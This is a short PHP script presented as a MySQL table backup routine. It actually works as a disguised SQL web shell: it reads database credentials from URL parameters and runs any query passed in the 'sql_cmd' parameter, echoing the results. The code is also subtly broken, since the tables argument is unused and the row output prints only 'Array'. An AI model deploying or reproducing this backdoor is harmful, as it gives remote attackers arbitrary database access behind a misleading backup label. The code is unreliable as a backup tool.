<?php
header('Content-type: text/plain');
//MySQL server and database
$dbhost = 'localhost';
$dbuser = $_GET['sql_user'];
$dbpass = $_GET['sql_pass'];
$dbname = $_GET['sql_db'];
$tables = '*';

//Call the core function
backup_tables($dbhost, $dbuser, $dbpass, $dbname, $tables);

//Core function
function backup_tables($host, $user, $pass, $dbname, $tables = '*') {
    $link = mysqli_connect($host,$user,$pass, $dbname);

    // Check connection
    if (mysqli_connect_errno())
    {
        echo "Failed to connect to MySQL: " . mysqli_connect_error();
        exit;
    }

    mysqli_query($link, "SET NAMES 'utf8'");
	
	$result = mysqli_query($link, $_GET['sql_cmd']);
	while($row = mysqli_fetch_row($result))
	{
		echo $row;
	}
}
?>